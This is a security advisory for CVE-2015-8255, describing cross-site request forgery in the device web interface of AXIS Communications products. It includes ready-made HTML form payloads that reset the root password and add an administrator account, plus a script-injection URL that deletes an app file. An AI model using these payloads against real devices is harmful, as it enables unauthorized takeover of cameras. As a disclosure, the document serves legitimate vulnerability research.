@@ -1,0 +1,103 @@
+          0RWELLL4BS
+          **********
+       security advisory
+         olsa-CVE-2015-8255
+         PGP: 79A6CCC0
+          @orwelllabs
+
+
+
+
+Advisory Information
+====================
+- Title: Cross-Site Request Forgery
+- Vendor: AXIS Communications
+- Research and Advisory: Orwelllabs
+- Class: Session Management control [CWE-352]
+- CVE Name: CVE-2015-8255
+- Affected Versions:
+- IoT Attack Surface: Device Web Interface
+- OWASP IoTTop10: I1
+
+
+
+Technical Details
+=================
+Because of the own (bad) design of this kind of device (Actualy a big
+problem of IoT, one of them)
+The embedded web application does not verify whether a valid request was
+intentionally provided by the user who submitted the request.
+
+
+
+PoCs
+====
+#-> Setting root password to W!nst0n
+
+<html>
+  <!-- CSRF PoC  Orwelllabs -->
+  <body>
+    <form action="http://xxx.xxx.xxx.xxx/axis-cgi/admin/pwdgrp.cgi">
+      <input type="hidden" name="action" value="update" />
+      <input type="hidden" name="user" value="root" />
+      <input type="hidden" name="pwd" value="w!nst0n" />
+      <input type="hidden" name="comment" value="Administrator" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+#-> Adding new credential SmithW:W!nst0n
+
+<html>
+  <!-- CSRF PoC - Orwelllabs -->
+  <body>
+    <form action="http://xxx.xxx.xxx.xxx/axis-cgi/admin/pwdgrp.cgi">
+      <input type="hidden" name="action" value="add" />
+      <input type="hidden" name="user" value="SmithW" />
+      <input type="hidden" name="sgrp"
+value="viewer&#58;operator&#58;admin&#58;ptz" />
+      <input type="hidden" name="pwd" value="W!nst0n" />
+      <input type="hidden" name="grp" value="users" />
+      <input type="hidden" name="comment" value="WebUser" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+#-> Deleting an app via directly CSRF (axis_update.shtml)
+
+http://xxx.xxx.xxx.xxx/axis-cgi/vaconfig.cgi?action=get&name=<script src="
+http://xxx.xxx.xxx.xxx/axis-cgi/admin/local_del.cgi?+/usr/html/local/viewer/axis_update.shtml
+"></script>
+
+
+[And many acitions allowed to an user [all of them?] can be forged in this
+way]
+
+
+Vendor Information, Solutions and Workarounds
++++++++++++++++++++++++++++++++++++++++++++++
+Well, this is a very old design problem of this kind of device, nothing new
+to say about that.
+
+
+Credits
+=======
+These vulnerabilities has been discovered and published by Orwelllabs.
+
+
+Legal Notices
+=============
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise. We accept no
+responsibility for any damage caused by the use or misuse of this
+information.
+
+
+About Orwelllabs
+================
+https://www.exploit-db.com/author/?a=8225
+https://packetstormsecurity.com/files/author/12322/
